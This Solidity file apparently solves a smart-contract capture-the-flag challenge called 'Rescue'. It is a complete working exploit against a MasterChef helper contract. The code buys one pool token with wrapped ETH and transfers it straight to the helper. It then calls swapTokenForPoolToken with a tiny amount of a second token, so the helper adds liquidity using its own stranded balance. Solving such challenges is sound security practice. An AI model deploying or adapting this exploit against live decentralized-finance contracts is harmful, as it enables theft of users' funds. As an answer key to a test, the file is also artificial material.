// SPDX-License-Identifier: GNU AGPLv3

pragma solidity 0.8.16;

interface UniswapV2RouterLike {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );
}

interface UniswapV2PairLike {
    function token0() external returns (address);

    function token1() external returns (address);
}

interface ERC20Like {
    function transferFrom(
        address,
        address,
        uint256
    ) external;

    function transfer(address, uint256) external;

    function approve(address, uint256) external;

    function balanceOf(address) external view returns (uint256);
}

interface WETH9 is ERC20Like {
    function deposit() external payable;
}

interface MasterChefLike {
    function poolInfo(uint256 id)
        external
        returns (
            address lpToken,
            uint256 allocPoint,
            uint256 lastRewardBlock,
            uint256 accSushiPerShare
        );
}

interface IMasterChefHelper {
    function router() external view returns (UniswapV2RouterLike);

    function masterchef() external view returns (MasterChefLike);

    function swapTokenForPoolToken(
        uint256 poolId,
        address tokenIn,
        uint256 amountIn,
        uint256 minAmountOut
    ) external;
}

interface ISetup {
    function mcHelper() external view returns (IMasterChefHelper);

    function weth() external view returns (WETH9);
}

contract Rescue {
    function main(WETH9 weth, IMasterChefHelper mcHelper) external payable {
        require(msg.value > 10 ether, "need more than 10 ether");

        UniswapV2RouterLike router = mcHelper.router();
        MasterChefLike masterchef = mcHelper.masterchef();

        // first 2 pools are against weth
        // lets find our tokenA and tokenB
        uint256 poolId1 = 1;
        uint256 poolId2 = 2;
        (address lpToken1, , , ) = masterchef.poolInfo(poolId1);
        address token0 = UniswapV2PairLike(lpToken1).token0();
        address token1 = UniswapV2PairLike(lpToken1).token1();
        address tokenA;
        (token0 == address(weth)) ? tokenA = token1 : tokenA = token0;

        (address lpToken2, , , ) = masterchef.poolInfo(poolId2);
        token0 = UniswapV2PairLike(lpToken2).token0();
        token1 = UniswapV2PairLike(lpToken2).token1();
        address tokenB;
        (token0 == address(weth)) ? tokenB = token1 : tokenB = token0;

        // now we want some weth to trade for tokenA
        weth.deposit{value: msg.value}();

        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = tokenA;

        ERC20Like(weth).approve(address(router), type(uint256).max);
        router.swapExactTokensForTokens(
            msg.value - 1 gwei,
            0,
            path,
            address(this),
            block.timestamp
        );

        // and we transfer them to the mcHelper
        ERC20Like(tokenA).transfer(
            address(mcHelper),
            ERC20Like(tokenA).balanceOf(address(this))
        );

        //now we want some tokenB to trigger the action of adding liquidity
        path[1] = tokenB;
        router.swapExactTokensForTokens(
            1 gwei,
            0,
            path,
            address(this),
            block.timestamp
        );

        // trigger
        ERC20Like(tokenB).approve(address(mcHelper), type(uint256).max);
        mcHelper.swapTokenForPoolToken(
            poolId1,
            address(tokenB),
            ERC20Like(tokenB).balanceOf(address(this)),
            0
        );
    }
}

contract Solution {
    // Send more that 10 ETH along with the deployment
    constructor(ISetup setup) payable {
        Rescue rescue = new Rescue();
        rescue.main{value: msg.value}(setup.weth(), setup.mcHelper());
    }
}
